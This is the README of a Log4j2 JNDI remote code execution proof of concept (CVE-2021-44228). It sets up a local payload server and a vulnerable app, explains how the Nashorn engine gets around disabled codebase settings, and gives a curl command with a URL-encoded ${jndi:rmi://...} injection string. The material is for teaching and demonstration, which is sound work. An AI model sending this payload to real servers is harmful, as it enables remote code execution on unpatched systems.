# Log4j2 RCE Vulnerability POC

A bare minimum proof-of-concept for Log4j2 JNDI Remote-Code-Execution vulnerability ([CVE-2021-44228][]). This is
intended for educational purposes to help people who are not security researchers to understand how it works and how
large the impact is.

The POC bypasses the requirement for setting `com.sun.jndi.rmi.object.trustURLCodebase`
and `com.sun.jndi.cosnaming.object.trustURLCodebase` properties to `true`
which [were disabled by default since 8u121, 7u131, 6u141](https://www.oracle.com/java/technologies/javase/8u121-relnotes.html)
.

## Prerequisites

- JDK 1.8

Note: JDK 1.8 is required for `payload-server` to compile, but the `victim-app` is vulnerable up until JDK 15
because [the Nashorn engine was removed in JDK 15][].

## To Test

1. Start the `payload-server` by running:

```console
$ ./gradlew runPayloadServer
```

2. Open a new terminal session then start the `victim-app`:

```console
$ ./gradlew runVictimApp
```

3. Run `curl http://localhost:8080/hello?name=%24%7Bjndi%3Armi%3A%2F%2F127.0.0.1%3A8099%2Fexec%7D` to trigger the RCE.
4. To proof the remote code has been executed, check the console log of `victim-app`. You should see an unintended log
   has been printed on the screen.

[CVE-2021-44228]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228

[the Nashorn engine was removed in JDK 15]: https://openjdk.java.net/jeps/372
